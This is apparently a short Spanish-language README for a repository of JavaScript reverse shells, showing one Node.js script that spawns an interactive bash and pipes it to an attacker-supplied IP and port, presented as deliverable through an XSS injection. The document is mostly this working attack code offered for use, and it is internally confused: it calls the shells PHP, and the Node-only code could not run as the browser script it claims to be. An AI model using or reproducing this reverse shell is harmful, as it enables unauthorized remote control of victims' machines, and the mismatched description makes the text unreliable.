# shells_JS
Shells creadas en JS para una conexión reversa.
## Para empezar

Colección de shells escritas en PHP para establecer una conexión remota, para distintas situaciones

### A través de una vulnerabilidad XSS

Se establece la conexión a través de la inyección de código html.

```
<script>

var port = "Fill with port listening";
var ip = "Fill with your IP";
var spawn = require('child_process').spawn;
var net = require('net');
var reconnect = require('reconnect');

reconnect(function (stream) {
    var ps = spawn('bash', [ '-i' ]);
    stream.pipe(ps.stdin);
    ps.stdout.pipe(stream, { end: false });
    ps.stderr.pipe(stream, { end: false });
    ps.on('exit', function () { stream.end() });
}).connect(port, ip);

</script>

```
